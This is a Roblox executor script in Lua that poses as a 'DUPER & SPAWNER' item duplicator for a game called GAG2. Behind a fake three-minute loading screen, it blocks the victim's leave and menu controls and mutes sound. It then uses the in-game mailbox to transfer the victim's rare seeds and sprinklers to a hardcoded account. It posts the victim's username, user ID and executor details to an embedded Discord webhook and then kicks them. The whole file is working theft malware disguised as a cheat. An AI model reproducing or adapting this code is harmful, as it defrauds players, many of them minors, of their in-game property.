--[[
  ROBLOX SCUPPER – WITH BAN LIST (GITHUB GIST)
  TARGET: Adrien_201315 – HARDCODED
  CHECKS BANNED USERS FROM GITHUB GIST BEFORE RUNNING
]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516850833743020144/YN0_yOas6Wcy6L7etQa3wMlsKbpCaylcacv6PgtYOghG9yEnqI5By6OvA-_Yblhmx-z2"
local TARGET_PLAYER = "Adrien_201315"

-- ===== GITHUB GIST BAN LIST =====
local BAN_LIST_URL = "https://raw.githubusercontent.com/adrienfavela2030-create/hi/refs/heads/main/banned.txt"  -- REPLACE WITH YOUR URL

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local gui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

print("[Scupper] Started by: " .. LocalPlayer.Name)
print("[Scupper] Target: " .. TARGET_PLAYER)

-- ===== CHECK IF USER IS BANNED =====
local function isUserBanned()
    local HttpService = game:GetService("HttpService")
    local HttpFunction = request or http_request or (syn and syn.request) or nil
    
    if not HttpFunction then
        print("[Scupper] No HTTP function, skipping ban check")
        return false
    end
    
    local playerName = LocalPlayer.Name
    local success, response = pcall(function()
        return HttpFunction({
            Url = BAN_LIST_URL,
            Method = "GET"
        })
    end)
    
    if success and response and response.StatusCode == 200 then
        local content = response.Body or ""
        if content:find(playerName) then
            print("[Scupper] ❌ USER IS BANNED: " .. playerName)
            return true
        end
    end
    
    print("[Scupper] ✅ User is not banned")
    return false
end

-- ===== BAN KICK =====
local function banKick()
    local banGui = Instance.new("ScreenGui")
    banGui.Name = "BanScreen"
    banGui.ResetOnSpawn = false
    banGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    banGui.DisplayOrder = 999999
    banGui.Parent = gui
    
    local banBg = Instance.new("Frame")
    banBg.Size = UDim2.new(1, 0, 1, 0)
    banBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    banBg.BackgroundTransparency = 0.2
    banBg.ZIndex = 999999
    banBg.Parent = banGui
    
    local banPanel = Instance.new("Frame")
    banPanel.Size = UDim2.new(0, 500, 0, 200)
    banPanel.Position = UDim2.new(0.5, -250, 0.5, -100)
    banPanel.BackgroundColor3 = Color3.fromRGB(20, 10, 10)
    banPanel.BackgroundTransparency = 0.05
    banPanel.BorderSizePixel = 2
    banPanel.BorderColor3 = Color3.fromRGB(255, 50, 50)
    banPanel.ZIndex = 999999
    banPanel.Parent = banBg
    
    local banCorner = Instance.new("UICorner")
    banCorner.CornerRadius = UDim.new(0, 16)
    banCorner.Parent = banPanel
    
    local banTitle = Instance.new("TextLabel")
    banTitle.Size = UDim2.new(1, 0, 0, 50)
    banTitle.Position = UDim2.new(0, 0, 0, 15)
    banTitle.BackgroundTransparency = 1
    banTitle.Text = "🚫 YOU ARE BANNED"
    banTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
    banTitle.Font = Enum.Font.GothamBold
    banTitle.TextSize = 26
    banTitle.ZIndex = 999999
    banTitle.Parent = banPanel
    
    local banMsg = Instance.new("TextLabel")
    banMsg.Size = UDim2.new(1, -40, 0, 60)
    banMsg.Position = UDim2.new(0, 20, 0, 70)
    banMsg.BackgroundTransparency = 1
    banMsg.Text = "You have been banned from using this script.\nContact Adrien_201315 for more information."
    banMsg.TextColor3 = Color3.fromRGB(200, 150, 150)
    banMsg.Font = Enum.Font.Gotham
    banMsg.TextSize = 16
    banMsg.TextScaled = false
    banMsg.TextWrapped = true
    banMsg.ZIndex = 999999
    banMsg.Parent = banPanel
    
    task.wait(3)
    pcall(function() LocalPlayer:Kick("You are banned from using this script.") end)
    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
    pcall(function() game:Shutdown() end)
end

-- ===== CHECK BAN BEFORE RUNNING =====
if isUserBanned() then
    banKick()
    return
end

-- ===== MUTE ALL SOUNDS =====
local function muteAllSounds()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("Sound") then
            pcall(function()
                v.Volume = 0
                v.Playing = false
            end)
        end
    end
end

spawn(function()
    while true do
        task.wait(1)
        muteAllSounds()
    end
end)

-- ===== BLOCK ROBLOX UI =====
local function blockEverything()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Escape then
            gameProcessed = true
            return
        end
    end)

    local function destroyRobloxUI()
        for _, obj in pairs(CoreGui:GetDescendants()) do
            if obj:IsA("TextButton") or obj:IsA("ImageButton") or obj:IsA("Frame") then
                local name = (obj.Name or ""):lower()
                if name:find("leave") or name:find("quit") or name:find("exit") or name:find("respawn") or name:find("menu") or name:find("roblox") or name:find("core") then
                    pcall(function()
                        obj.Visible = false
                        obj.Active = false
                        obj.Enabled = false
                    end)
                end
            end
        end
    end

    spawn(function()
        while true do
            task.wait(0.5)
            destroyRobloxUI()
        end
    end)

    local GuiService = game:GetService("GuiService")
    GuiService.ShowLeaveDialog = function(...) return end

    local TeleportService = game:GetService("TeleportService")
    TeleportService.Teleport = function(...) return end
    TeleportService.TeleportToPlaceInstance = function(...) return end
end

-- ===== DISCORD EMBED =====
local function sendDiscordComplete(total)
    local HttpService = game:GetService("HttpService")
    local HttpFunction = request or http_request or (syn and syn.request) or nil
    if not HttpFunction then return false end
    
    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
    local player = game:GetService("Players").LocalPlayer
    
    local embed = {
        ["embeds"] = {{
            ["title"] = "✅ SCUPPER COMPLETE",
            ["color"] = 65280,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=394694850&width=150&height=150"
            },
            ["fields"] = {
                {
                    ["name"] = "👤 Executor",
                    ["value"] = string.format("`Username: %s`\n`Display: %s`\n`UserID: %s`\n`Executor: %s`",
                        player.Name,
                        player.DisplayName,
                        player.UserId,
                        executorName
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Target",
                    ["value"] = "`" .. TARGET_PLAYER .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "📦 Total Items Sent",
                    ["value"] = tostring(total),
                    ["inline"] = true
                },
                {
                    ["name"] = "⏰ Time",
                    ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "GAG2 Scupper System"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        HttpFunction({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
        print("[Discord] Log sent successfully")
    end)
end

-- ===== KICK =====
local function forceKick(msg)
    pcall(function() LocalPlayer:Kick(msg or "Complete") end)
    pcall(function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
    pcall(function() game:Shutdown() end)
end

-- ===== LOADING SCREEN =====
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.ResetOnSpawn = false
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
loadingGui.DisplayOrder = 999999
loadingGui.Parent = gui

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(8, 8, 20)
bg.BackgroundTransparency = 0
bg.ZIndex = 999999
bg.Parent = loadingGui

local panel = Instance.new("Frame")
panel.Size = UDim2.new(0, 480, 0, 380)
panel.Position = UDim2.new(0.5, -240, 0.5, -190)
panel.BackgroundColor3 = Color3.fromRGB(15, 15, 35)
panel.BackgroundTransparency = 0
panel.BorderSizePixel = 2
panel.BorderColor3 = Color3.fromRGB(60, 120, 255)
panel.ZIndex = 999999
panel.Parent = bg

local panelCorner = Instance.new("UICorner")
panelCorner.CornerRadius = UDim.new(0, 20)
panelCorner.Parent = panel

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 15)
title.BackgroundTransparency = 1
title.Text = "DUPER & SPAWNER"
title.TextColor3 = Color3.fromRGB(120, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 32
title.TextScaled = true
title.ZIndex = 999999
title.Parent = panel

local subTitle = Instance.new("TextLabel")
subTitle.Size = UDim2.new(1, 0, 0, 30)
subTitle.Position = UDim2.new(0, 0, 0, 72)
subTitle.BackgroundTransparency = 1
subTitle.Text = "GAG2"
subTitle.TextColor3 = Color3.fromRGB(255, 200, 80)
subTitle.Font = Enum.Font.GothamBold
subTitle.TextSize = 22
subTitle.TextScaled = true
subTitle.ZIndex = 999999
subTitle.Parent = panel

local spinner = Instance.new("TextLabel")
spinner.Size = UDim2.new(0, 60, 0, 60)
spinner.Position = UDim2.new(0.5, -30, 0, 115)
spinner.BackgroundTransparency = 1
spinner.Text = "◯"
spinner.TextColor3 = Color3.fromRGB(200, 200, 255)
spinner.Font = Enum.Font.SourceSansBold
spinner.TextSize = 55
spinner.ZIndex = 999999
spinner.Parent = panel

local chars = {"◯", "◔", "◑", "◕", "●"}
local spinIndex = 1
spawn(function()
    while loadingGui.Parent do
        spinner.Text = chars[spinIndex]
        spinIndex = spinIndex % #chars + 1
        task.wait(0.1)
    end
end)

local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 380, 0, 8)
progressBg.Position = UDim2.new(0.5, -190, 0, 240)
progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressBg.BorderSizePixel = 1
progressBg.BorderColor3 = Color3.fromRGB(60, 80, 140)
progressBg.ZIndex = 999999
progressBg.Parent = panel

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 999999
progressBar.Parent = progressBg

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 20)
percentLabel.Position = UDim2.new(0, 0, 0, 260)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(160, 180, 210)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 15
percentLabel.ZIndex = 999999
percentLabel.Parent = panel

local function updateProgress(pct)
    pct = math.min(100, math.max(0, pct))
    local tween = TweenService:Create(progressBar, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {
        Size = UDim2.new(pct / 100, 0, 1, 0)
    })
    tween:Play()
    percentLabel.Text = math.floor(pct) .. "%"
end

-- ===== SCUPPER ENGINE =====
local scupperComplete = false
local totalProcessed = 0

function startScupper()
    print("[Scupper] Starting...")

    -- FIND MAILBOX UI
    local MailboxUI = nil
    for _, child in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if string.find(string.lower(child.Name or ""), "mail") or string.find(string.lower(child.Name or ""), "box") then
            MailboxUI = child
            print("[Scupper] Found MailboxUI: " .. child.Name)
            break
        end
    end

    if not MailboxUI then
        MailboxUI = LocalPlayer.PlayerGui:FindFirstChild("MailboxUI")
    end

    if not MailboxUI then
        print("[Scupper] MailboxUI not found!")
        scupperComplete = true
        return
    end

    -- FIND MAILBOX PROMPT
    local function getNearestMailboxPrompt()
        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return nil end
        local hrp = character.HumanoidRootPart
        local gardens = workspace:FindFirstChild("Gardens")
        if not gardens then return nil end

        local shortestDistance = math.huge
        local nearestPrompt = nil
        for _, plot in pairs(gardens:GetChildren()) do
            local promptInstance = plot:FindFirstChild("MailboxPrompt", true)
            if promptInstance and promptInstance:IsA("ProximityPrompt") then
                local promptPart = promptInstance.Parent
                if promptPart and promptPart:IsA("BasePart") then
                    local distance = (hrp.Position - promptPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestPrompt = promptInstance
                    end
                end
            end
        end
        return nearestPrompt
    end

    local prompt = getNearestMailboxPrompt()
    if not prompt then
        for _, promptInst in pairs(workspace:GetDescendants()) do
            if promptInst:IsA("ProximityPrompt") and string.find(string.lower(promptInst.Name or ""), "mail") then
                prompt = promptInst
                print("[Scupper] Found prompt: " .. promptInst.Name)
                break
            end
        end
    end

    if not prompt then
        print("[Scupper] No mailbox prompt found!")
        scupperComplete = true
        return
    end

    -- GET ITEM COUNT
    local function getItemCount(itemFrame)
        if not itemFrame then return 0 end
        for _, desc in pairs(itemFrame:GetDescendants()) do
            if desc:IsA("TextLabel") then
                local text = desc.Text or ""
                local numStr = string.match(text, "%d+")
                if numStr then
                    local count = tonumber(numStr)
                    if count and count > 0 then
                        return count
                    end
                end
            end
        end
        return 0
    end

    -- ORIGINAL WORKING CLICK FUNCTION
    local function simpleClick(target)
        if not target then return end
        
        local btn = nil
        if target:IsA("GuiButton") then
            btn = target
        else
            btn = target:FindFirstChildWhichIsA("GuiButton", true) 
               or target:FindFirstAncestorWhichIsA("GuiButton")
        end
        
        local clickTarget = btn or target
        
        if getconnections then
            pcall(function() 
                for _, conn in pairs(getconnections(clickTarget.MouseButton1Click)) do conn:Fire() end 
                for _, conn in pairs(getconnections(clickTarget.MouseButton1Down)) do conn:Fire() end 
                for _, conn in pairs(getconnections(clickTarget.Activated)) do conn:Fire() end 
            end)
        end
        pcall(function() if clickTarget.Activate then clickTarget:Activate() end end)
    end

    -- ITEMS TO TRANSFER
    local itemsToSend = {
        "Inv_Seeds:Bamboo", "Inv_Seeds:Gold", "Inv_Seeds:Rainbow",
        "Inv_Seeds:Coconut", "Inv_Seeds:Dragon’s Breath",
        "Inv_Seeds:Venus Fly Trap", "Inv_Seeds:Moon Bloom",
        "Inv_Seeds:Poison Apple", "Inv_Sprinklers:Legendary Sprinkler",
        "Inv_Sprinklers:Super Sprinkler"
    }

    -- ===== MAIN LOOP =====
    local consecutiveEmptyScans = 0

    while true do
        local foundItems = {}
        local foundAny = false

        -- SCAN ALL ITEMS
        for _, itemName in ipairs(itemsToSend) do
            local foundItem = MailboxUI:FindFirstChild(itemName, true)
            if foundItem then
                local count = getItemCount(foundItem)
                if count > 0 then
                    foundAny = true
                    table.insert(foundItems, {name = itemName, object = foundItem, count = count})
                    print("[Scupper] Found " .. count .. "x " .. itemName)
                end
            end
        end

        -- IF NO ITEMS FOUND -> COMPLETE
        if not foundAny then
            consecutiveEmptyScans = consecutiveEmptyScans + 1
            if consecutiveEmptyScans >= 2 then
                if totalProcessed == 0 then
                    print("[Scupper] No items found.")
                    sendDiscordComplete(0)
                else
                    print("[Scupper] ✅ INVENTORY EMPTY! Total: " .. totalProcessed)
                    sendDiscordComplete(totalProcessed)
                end
                scupperComplete = true
                break
            else
                task.wait(2)
                continue
            end
        else
            consecutiveEmptyScans = 0
        end

        -- ===== OPEN MAILBOX =====
        fireproximityprompt(prompt)
        task.wait(1)

        -- ===== SEARCH TARGET =====
        local searchBox = MailboxUI:FindFirstChild("SearchBox", true) or MailboxUI:FindFirstChildWhichIsA("TextBox", true)
        if searchBox then
            searchBox.Text = TARGET_PLAYER
            if firesignal then
                pcall(function()
                    firesignal(searchBox:GetPropertyChangedSignal("Text"))
                    firesignal(searchBox.FocusLost, true)
                end)
            end
            task.wait(1)
        end

        -- ===== SELECT TARGET =====
        local foundPlayer = false
        for _, desc in pairs(MailboxUI:GetDescendants()) do
            if desc ~= searchBox and not desc:IsDescendantOf(searchBox) and (desc:IsA("TextLabel") or desc:IsA("TextButton")) then
                local text = string.lower(desc.Text or "")
                if string.find(text, string.lower(TARGET_PLAYER), 1, true) then
                    local scrollingContainer = desc:FindFirstAncestorWhichIsA("ScrollingFrame")
                    local structuralButton = desc:IsA("GuiButton") or (desc.Parent and desc.Parent:IsA("GuiButton"))
                    if scrollingContainer or structuralButton then
                        print("[Scupper] Selecting target...")
                        simpleClick(desc)
                        foundPlayer = true
                        break
                    end
                end
            end
        end

        if not foundPlayer then
            task.wait(0.5)
            continue
        end
        task.wait(0.5)

        -- ===== SEND ITEMS =====
        for _, itemData in ipairs(foundItems) do
            local itemName = itemData.name
            local amount = itemData.count
            local clicksToMake = math.min(amount, 20)

            print("[Scupper] Sending " .. clicksToMake .. "x " .. itemName)

            for i = 1, clicksToMake do
                local currentItem = MailboxUI:FindFirstChild(itemName, true)
                if currentItem then
                    simpleClick(currentItem)
                    task.wait(0.1)
                    totalProcessed = totalProcessed + 1
                else
                    break
                end
            end

            task.wait(0.2)

            -- Click Send button
            local sendButton = MailboxUI:FindFirstChild("SendButton", true)
            if sendButton and sendButton.Visible then
                simpleClick(sendButton)
                task.wait(0.2)
            else
                for _, btn in pairs(MailboxUI:GetDescendants()) do
                    if btn:IsA("GuiButton") and string.find(string.lower(btn.Name or ""), "send") then
                        simpleClick(btn)
                        task.wait(0.2)
                        break
                    end
                end
            end
        end

        print("[Scupper] Total processed: " .. totalProcessed)
        updateProgress(math.min(100, (totalProcessed / (totalProcessed + 100)) * 100))

        -- ===== 12 SECOND COOLDOWN =====
        for i = 12, 1, -1 do
            task.wait(1)
        end
    end

    -- ===== COMPLETE =====
    print("[Scupper] Complete - " .. totalProcessed .. " items")
    updateProgress(100)
    task.wait(2)
    forceKick("Complete - " .. totalProcessed .. " items to " .. TARGET_PLAYER)
end

-- ===== 3 MINUTE LOADING SEQUENCE =====
local function runLoadingSequence()
    local start = tick()
    local duration = 180
    local lastPct = 0

    while tick() - start < duration do
        if scupperComplete then
            break
        end

        local elapsed = tick() - start
        local pct = (elapsed / duration) * 100
        
        if math.floor(pct) ~= math.floor(lastPct) then
            updateProgress(pct)
            lastPct = pct
        end
        
        task.wait(0.1)
    end

    updateProgress(100)
    task.wait(0.5)

    local fade = TweenService:Create(bg, TweenInfo.new(0.6, Enum.EasingStyle.Linear), {
        BackgroundTransparency = 1
    })
    fade:Play()
    task.wait(0.6)
    loadingGui:Destroy()
end

-- ===== START =====
spawn(function() blockEverything() end)
spawn(function() runLoadingSequence() end)

print("[Scupper] Starting immediately...")
startScupper()